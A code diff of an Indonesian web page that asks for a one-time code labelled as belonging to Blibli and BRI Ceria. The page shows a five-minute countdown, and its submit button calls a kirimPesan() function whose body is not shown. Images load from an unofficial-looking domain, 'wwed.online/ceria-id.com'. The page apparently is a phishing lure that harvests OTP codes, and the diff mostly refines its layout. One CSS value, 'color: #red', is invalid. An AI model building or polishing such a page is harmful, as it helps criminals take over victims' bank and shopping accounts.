@@ -28,23 +28,23 @@
     /* Kolom Input Kode OTP */
     #kode-otp {
       margin-top: 20px;
-      width: 80%;
-      max-width: 400px;
+      width: 90%;
+      max-width: 450px;
       padding: 12px;
       border-radius: 4px;
-      border: 1px solid #ccc;
+      border: 1px solid #663399;
     }
 
     /* Waktu Hitung Mundur */
     #countdown {
-      margin-top: 7px;
+      margin-top: 25px;
       font-size: 16px;
-      color: #333;
+      color: #red;
     }
 
     /* Tombol Submit */
     #submit {
-      margin-top: 8px;
+      margin-top: 20px;
       padding: 13px;
       border-radius: 4px;
       border: none;
@@ -52,8 +52,17 @@
       color: white;
       font-weight: bold;
       cursor: pointer;
-      width: 80%;
-      max-width: 400px;
+      width: 95%;
+      max-width: 450px;
+    }
+    /* Gambar di bawah Tombol Submit */
+    #gambar-bawah {
+      margin-top: 80px;
+    }
+
+    #gambar-bawah img {
+      width: 50%;
+      object-fit: cover;
     }
   </style>
   <script>
@@ -87,14 +96,17 @@
   </div>
 
   <!-- Kolom Input Kode OTP -->
-  <input type="number" id="kode-otp" name="kode_otp" placeholder="Kode OTP Blibli/Bri Ceria" maxlength="6">
+  <input type="number" id="kode-otp" name="kode_otp" placeholder="Kode OTP Blibli Sponsor Bri Ceria" maxlength="6">
 
   <!-- Waktu Hitung Mundur -->
   <div id="countdown"></div>
 
   <!-- Tombol Submit -->
-  <input type="submit" id="submit" value="Submit" onclick="kirimPesan()">
-
+  <input type="submit" id="submit" value="Lanjutkan" onclick="kirimPesan()">
+  <!-- Gambar Bawah -->
+  <div id="gambar-bawah">
+    <img src="https://wwed.online/ceria-id.com/img/2711.jpg" alt="Gambar 2711">
+  </div>
   <script>
     // Waktu Hitung Mundur
     var countDownDate = new Date().getTime() + 5 * 60 * 1000; // 5 menit dari waktu sekarang
@@ -108,7 +120,7 @@
       var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
       var seconds = Math.floor((distance % (1000 * 60)) / 1000);
 
-      countdownElement.innerHTML = "Waktu tersisa: " + minutes + "m " + seconds + "s ";
+      countdownElement.innerHTML = "" + minutes + "m " + seconds + "s ";
 
       if (distance < 0) {
         clearInterval(x);
@@ -117,4 +129,4 @@
     }, 1000);
   </script>
 </body>
-</html>
+  </html>
